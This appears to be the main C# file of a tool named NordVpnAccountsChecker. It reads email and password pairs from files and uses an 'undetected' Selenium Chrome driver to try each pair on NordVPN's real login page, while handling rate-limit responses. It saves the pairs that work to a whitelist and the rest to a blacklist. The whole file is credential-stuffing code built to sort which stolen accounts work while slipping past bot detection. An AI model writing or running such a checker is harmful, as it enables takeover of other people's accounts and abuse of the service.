using OpenQA.Selenium;
using NordVpnAccountsChecker.Extensions;
using NordVpnAccountsChecker.Components;

var blacklist = new AccountsFileStorage(fileName: "_blacklist");
blacklist.ReadAccounts();
Console.WriteLine($"Found {blacklist.GetAccounts().Count} accounts in the blacklist");

var whitelist = new AccountsFileStorage(fileName: "_whitelist");
whitelist.ReadAccounts();
Console.WriteLine($"Found {whitelist.GetAccounts().Count} accounts in the whitelist");

var handledAccounts = blacklist.GetAccounts()
                               .Union(whitelist.GetAccounts())
                               .DistinctBy(s => s.Key)
                               .ToDictionary(s => s.Key, s => s.Value);

Console.WriteLine($"Found {handledAccounts.Count} handled accounts");

var accounts = AccountsFileParser.ParseDirectory(relativePath: "Files");

var accountsToParse = accounts
                            .ExceptBy(handledAccounts.Select(s => s.Key), account => account.Key)
                            .OrderBy(s => s.Key)
                            .ToDictionary(s => s.Key, s => s.Value);

Console.WriteLine($"Found {accountsToParse.Count} accounts to handle");

var prefs = new Dictionary<string, object>()
{
    { "credentials_enable_service", false } // disable auth popups after login
};

using (IWebDriver driver = ChromeDriverEx.CreateUndetectedChromeDriver(prefs))
{
    var loginUrl = "https://my.nordaccount.com/oauth2/login";
    var navigateToLoginPage = true;

    foreach (var account in accountsToParse)
    {
        if (navigateToLoginPage)
        {
            driver.Navigate().GoToUrl(loginUrl);
        }

        driver.HandleTooManyRequests(loginUrl);

        driver.EnterLoginAndSubmit(account.Key);

        driver.EnterPasswordAndSignIn(account.Value);

        try
        {
            var success = driver.HandleMessage();

            if (success)
            {
                whitelist.AddAccount(account.Key, account.Value);

                Console.WriteLine($"{account.Key} added to the whitelist");
            }
            else
            {
                blacklist.AddAccount(account.Key, account.Value);

                Console.WriteLine($"{account.Key} added to the blacklist");
            }

            navigateToLoginPage = true;
        }
        catch
        {
            navigateToLoginPage = false;
        }
    }
}